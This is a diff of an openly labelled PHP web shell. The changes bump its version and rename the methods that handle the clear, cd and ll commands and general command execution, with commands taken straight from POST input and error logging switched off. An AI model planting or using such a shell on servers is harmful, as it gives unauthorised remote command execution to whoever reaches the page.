@@ -4,7 +4,7 @@
  *
  * A simple web shell made in PHP.
  *
- * @since 1.0.3
+ * @since 1.0.4
  * @link  https://saku.fun/
  */
 ini_set('log_errors', '0');
@@ -37,24 +37,24 @@ if (isset($_POST['cmd'])) {
 
     // Screen reset.
     if ($cmd === 'clear') {
-        $Shell->Cmd_clear();
+        $Shell->clear();
         exit();
     }
 
     // Update current directory.
     if (preg_match("/^cd\s/i", $cmd) || preg_match("/^cd$/i", $cmd)) {
-        $Shell->Cmd_cd($cmd);
+        $Shell->cd($cmd);
         exit();
     }
 
     // Update current directory.
     if (preg_match("/^ll\s/i", $cmd) || preg_match("/^ll$/i", $cmd)) {
-        $Shell->Cmd_ll($cmd);
+        $Shell->ll($cmd);
         exit();
     }
 
     // Command execution and execution result recording.
-    $Shell->Cmd_exec($cmd);
+    $Shell->exec($cmd);
 }
 
 // View
